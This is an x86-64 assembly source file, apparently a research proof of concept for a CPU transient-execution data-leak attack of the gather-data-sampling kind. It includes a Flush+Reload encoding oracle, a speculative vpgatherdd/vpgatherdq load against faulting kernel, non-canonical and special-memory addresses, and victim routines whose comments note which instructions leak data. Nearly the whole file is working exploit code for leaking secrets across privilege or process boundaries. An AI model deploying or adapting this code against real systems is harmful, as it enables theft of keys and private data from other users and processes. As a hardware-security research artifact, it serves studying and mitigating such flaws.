#include "config.h"

.data

.align 0x1000
    .global oracles
oracles:
    .space 64*4096*256, 0

    .global address_normal
address_normal:
    .space 4096*16, 0


.align 0x1000
    .global address_US
address_US:
    .space 4096, 0x50


    .global address_MPK
address_MPK:
    .space 4096, 0x50

    .global address_UC
address_UC:
    .space 4096, 0

    .global address_WC
address_WC:
    .space 4096, 0

    .global address_D
address_D:
    .space 4096, 0


    .global address_A
address_A:
    .space 4096, 0

address_helper:
    .space 4096*8, 0    


.global source
source:
    .space 4096, 0

     .global dest
dest:
    .space 4096, 0


.text



.macro encode_ymm
    .set i,0
    .rept BYTE_TRY/8
    vextracti128 $i/2, %ymm5, %xmm0
    pextrq $i%2, %xmm0, %rax
    
    mov %rax, %rbx
    mov %rax, %rcx
    mov %rax, %rdx
    mov %rax, %r8
    mov %rax, %r9
    mov %rax, %r10
    mov %rax, %r11
    
    lea oracles+(8*i+0)*256*4096, %r13
    shr $0, %rax
    and $0xff, %rax
    shlq $12, %rax
    mov (%r13,%rax,1), %rax

    lea oracles+(8*i+1)*256*4096, %r13
    shr $8, %rbx
    and $0xff, %rbx
    shlq $12, %rbx
    mov (%r13,%rbx,1), %rax

    lea oracles+(8*i+2)*256*4096, %r13
    shr $16, %rcx
    and $0xff, %rcx
    shlq $12, %rcx
    mov (%r13,%rcx,1), %rax

    lea oracles+(8*i+3)*256*4096, %r13
    shr $24, %rdx
    and $0xff, %rdx
    shlq $12, %rdx
    mov (%r13,%rdx,1), %rax

    lea oracles+(8*i+4)*256*4096, %r13
    shr $32, %r8
    and $0xff, %r8
    shlq $12, %r8
    mov (%r13,%r8,1), %rax

    lea oracles+(8*i+5)*256*4096, %r13
    shr $40, %r9
    and $0xff, %r9
    shlq $12, %r9
    mov (%r13,%r9,1), %rax

    lea oracles+(8*i+6)*256*4096, %r13
    shr $48, %r10
    and $0xff, %r10
    shlq $12, %r10
    mov (%r13,%r10,1), %rax

    lea oracles+(8*i+7)*256*4096, %r13
    shr $56, %r11
    and $0xff, %r11
    shlq $12, %r11
    mov (%r13,%r11,1), %rax
    
    .set i,i+1
    .endr 
.endm

    # %rdi p perm
    # %rsi p index
    .align 0x1000
    .global s_load_encode
s_load_encode:

    
    lfence
    mfence 
    .rept 32
    inc %rax
    .endr  

#if AVX_512
    vmovups (%rdi), %zmm3
    vpxord %zmm1, %zmm1, %zmm1
    vmovups (%rsi), %zmm1
    mov $0b1111111111111111, %rdi
    kmovq %rdi, %k1
    kmovq %rdi, %k2
#else
    vmovups (%rdi), %ymm3
    vpxord %ymm1, %ymm1, %ymm1
    vmovups (%rsi), %ymm1
    vpcmpeqb %ymm2, %ymm2, %ymm2
#endif



#if FAULT_KERNEL
    mov $ADDRESS_KERNEL, %r13
#elif FAULT_NC
    mov $ADDRESS_NC, %r13
#elif FAULT_PF
    mov $0, %r13
#elif ASSIST_UC
    lea address_UC, %r13
#elif ASSIST_A
    lea address_A, %r13
#elif ASSIST_WC
    lea address_WC, %r13
#elif ASSIST_D
    lea address_D, %r13
#elif ASSIST_MPK
    lea address_MPK, %r13

#else
    lea address_normal, %r13
    xor %r11, %r11
#endif


#if P_CACHE_MISS
    lea address_helper, %rdi


    .set i,0
    .rept 0
    clflush 64*i(%rdi)
    mov 64*i(%rdi), %rax
    .set i,i+1
    .endr 
    

    .set i,0
    .rept 8
    xchg %rax, 64*i(%rdi)
    .set i,i+1
    .endr 
    

    .set i,0
    .rept 0
    lock incq 64*i(%rdi)
    .set i,i+1
    .endr 
    
    //MOVDIR64B 64(%r13), %r13
    //lock incq 0(%r13)
    //lock decq 0(%r13)
    
#endif

#if P_PAGE_FAULT
    mov 0, %rdi
#endif
    
    
    
    /*
    rdtscp
    mov %rax, %rdi
    */

#if AVX_512
    vpgatherdq 0(%r13, %ymm1, 1), %zmm5{%k1} 
    vpermd %zmm5, %zmm3, %zmm5{%k2}
    //vmovups %zmm5, (%rsi)
#else
    vpgatherdd %ymm2, 0(%r13, %ymm1, 1), %ymm5
    vpermd %ymm5, %ymm3, %ymm5
    //vmovups %ymm5, (%rsi)
#endif

    //mov 0, %rdi

    /*
    rdtscp
    sub %rdi, %rax
    mov %rax, 56(%rsi)    
    */

    encode_ymm
    ret


   .global victim_asm
victim_asm: 
    lea source, %rsi
#if VICTIM_FXRSTOR  || VICTIM_VCOMPRESS || VICTIM_TRY_NEW

    vmovups (%rsi), %zmm0
    vmovups %zmm0, %zmm1
    vmovups %zmm0, %zmm2
    vmovups %zmm0, %zmm3
#endif

loop:

#if VICTIM_MOVDIR64B
    lea dest, %rdi
    MOVDIR64B (%rsi), %rdi
#endif

#if VICTIM_VMOVSHDUP
    VMOVSHDUP (%rsi), %ymm0 // leaks duplicate pairs
#endif

#if VICTIM_BROADCAST
    VPBROADCASTd (%rsi), %zmm0 // leaks the repeated dword
#endif

#if VICTIM_MASKMOV
    //vpcmpeqb %ymm2, %ymm2, %ymm2
    vpxord %ymm2, %ymm2, %ymm2
    mov $0b1, %rax
    movq %rax, %xmm2
    vpmaskmovq (%rsi), %ymm2, %ymm10 // leaks even with zero mask (no arch load)
#endif


#if VICTIM_AESNI
    //AESENC (%rsi), %xmm0 // VAESENC 
    VAESKEYGENASSIST $2, (%rsi), %xmm0
#endif

#if VICTIM_VCOMPRESS
    VPCOMPRESSQ %zmm2, (%rsi) // store leak
#endif 

#if VICTIM_VGATHER
    vpxord %zmm1, %zmm1, %zmm1
    mov $1, %rdi
    kmovq %rdi, %k1
    vpgatherdd 0(%rsi, %zmm1, 1), %zmm2{%k1}
#endif

#if VICTIM_REPMOV
    lea source, %rsi
    mov $0, %rdi
    mov $0, %rcx // Cool! Leaking unloaded data.
    //STD // This could be used as a mitigation
    rep movsb
#endif

#if VICTIM_VMOVUPS  
    vmovups (%rsi), %zmm0
    vmovups 64(%rsi), %zmm0
    vmovups 128(%rsi), %zmm0
#endif

#if VICTIM_VMOVNT  
    vmovntdqa (%rsi), %zmm0
#endif 

#if VICTIM_FXRSTOR  
    fxsave address_normal
    fxrstor address_normal
#endif

#if VICTIM_CPUID
    mov $0x80000002, %eax
    cpuid
#endif


#if VICTIM_XRSTOR
    mov   $0, %rax 
    mov   $0, %rdx
    mov   $0x4e4e4e4e4e4e4e4e, %r13 // N 3
    mov   $0x5050505050505050, %r15 // P 1
    mov   $0x4747474747474747, %rsi // G 6
    mov   $0x4d4d4d4d4d4d4d4d, %r12 // M 4
    mov   $0x4f4f4f4f4f4f4f4f, %r14 // O 2
    mov   $0x4c4c4c4c4c4c4c4c, %r11 // L 7
    mov   $0x4545454545454545, %rdx // E 5
    mov   $0x4949494949494949, %r10 // I 8
    xsave address_normal
    xrstor address_normal
    
#endif  

    
#if VICTIM_REGISTERS

    mov   $0x4141414141414141, %rax // A
    mov   $0x4343434343434343, %r8  // C
    mov   $0x4a4a4a4a4a4a4a4a, %rbp // J
    mov   $0x4e4e4e4e4e4e4e4e, %r13 // N
    mov   $0x5050505050505050, %r15 // P
    mov   $0x4747474747474747, %rsi // G
    mov   $0x4d4d4d4d4d4d4d4d, %r12 // M
    mov   $0x4f4f4f4f4f4f4f4f, %r14 // O
    mov   $0x4444444444444444, %rcx // D
    mov   $0x4c4c4c4c4c4c4c4c, %r11 // L
    mov   $0x4545454545454545, %rdx // E
    mov   $0x4242424242424242, %rbx // B
    mov   $0x4848484848484848, %rdi // H
#if !SINGLE_THREAD
    mov   $0x4b4b4b4b4b4b4b4b, %rsp // K
#endif
    mov   $0x4949494949494949, %r10 // I
    mov   $0x4646464646464646, %r9  // F

    sub $2, %r12
    add $1, %r15
    add $1, %r8
    sub $2, %r8
    add $1, %r11
    sub $2, %r15
    sub $2, %r9
    sub $2, %r10
    sub $2, %r13
    add $1, %r14
    sub $2, %r11
    add $1, %r12
    add $1, %r13
    sub $2, %r14
    add $1, %r10
    add $1, %r9
#endif 

#if SINGLE_THREAD
    ret
#else
    jmp loop
#endif

/*
TGL

0   1   2   3   4   5   6   7   8   9   10  11  12  13  14  15  16
r15 (P) |r14 (O)|r13 (N)|r12 (M)|rbp (J)|rbx (B)|r11 (L)|r10 (I)|
r9  (F) |r8  (C)|rax (A)|rcx (D)|rdx (E)|rsi (G)|rdi (H)|
                        |rsp (K)|
*/
